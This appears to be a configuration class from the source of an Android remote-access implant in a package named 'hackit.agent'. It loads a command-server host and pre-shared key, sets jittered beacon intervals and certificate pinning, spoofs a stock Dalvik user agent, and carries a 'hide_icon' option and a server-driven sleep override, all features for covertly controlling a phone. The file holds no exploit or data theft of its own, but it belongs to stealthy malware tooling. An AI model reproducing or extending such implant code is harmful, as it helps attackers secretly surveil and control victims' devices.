package com.hackit.agent;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.util.Base64;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/** Build-time config (assets/agent.json) with a prefs overlay for runtime tweaks. */
final class Config {
    private static final String PREFS = "svc";
    private static final String KEY = "bootstrap";

    final String host;
    final byte[] psk;
    final String label;
    final long intervalMs;
    final double jitter;
    final String pin;
    final String userAgent;
    boolean hideIcon;
    long sleepOverrideMs;

    private Config(JSONObject json) throws Exception {
        host = json.getString("host").replaceAll("/+$", "");
        byte[] raw = Base64.decode(json.getString("psk"), Base64.DEFAULT);
        if (raw.length != 32) {
            throw new IllegalStateException("psk length " + raw.length);
        }
        psk = raw;
        label = json.optString("label", "android");
        intervalMs = Math.max(15000L, json.optLong("interval", 60000L));
        jitter = Math.min(0.6, Math.max(0.0, json.optDouble("jitter", 0.3)));
        pin = json.optString("pin", "").replace(":", "").toLowerCase();
        userAgent = json.optString("user_agent", "Dalvik/2.1.0 (Linux; U; Android)");
        hideIcon = json.optBoolean("hide_icon", false);
    }

    private static volatile Config cached;

    static Config get(Context ctx) {
        Config local = cached;
        if (local != null) {
            return local;
        }
        synchronized (Config.class) {
            if (cached == null) {
                cached = load(ctx.getApplicationContext());
            }
            return cached;
        }
    }

    private static Config load(Context ctx) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            String blob = prefs.getString(KEY, null);
            JSONObject json;
            if (blob != null) {
                json = new JSONObject(blob);
            } else {
                AssetManager assets = ctx.getAssets();
                InputStream in = assets.open("agent.json");
                ByteArrayOutputStream out = new ByteArrayOutputStream(1024);
                byte[] buf = new byte[4096];
                int read;
                while ((read = in.read(buf)) > 0) {
                    out.write(buf, 0, read);
                }
                in.close();
                json = new JSONObject(out.toString("UTF-8"));
                prefs.edit().putString(KEY, json.toString()).apply();
            }
            Config config = new Config(json);
            config.sleepOverrideMs = prefs.getLong("sleep", 0L);
            return config;
        } catch (Exception exc) {
            throw new IllegalStateException("agent config unusable: " + exc, exc);
        }
    }

    void saveSleep(Context ctx, long ms) {
        sleepOverrideMs = ms;
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putLong("sleep", ms).apply();
    }

    void saveHideIcon(Context ctx, boolean hide) {
        hideIcon = hide;
    }

    /** Current wait between polls: server override, else base, plus signed jitter. */
    long nextDelayMs() {
        long base = sleepOverrideMs > 0 ? Math.max(5000L, sleepOverrideMs) : intervalMs;
        double spread = 1.0 + (Math.random() * 2.0 - 1.0) * jitter;
        return Math.max(4000L, (long) (base * spread));
    }

    String url(String path) {
        return host + path;
    }
}
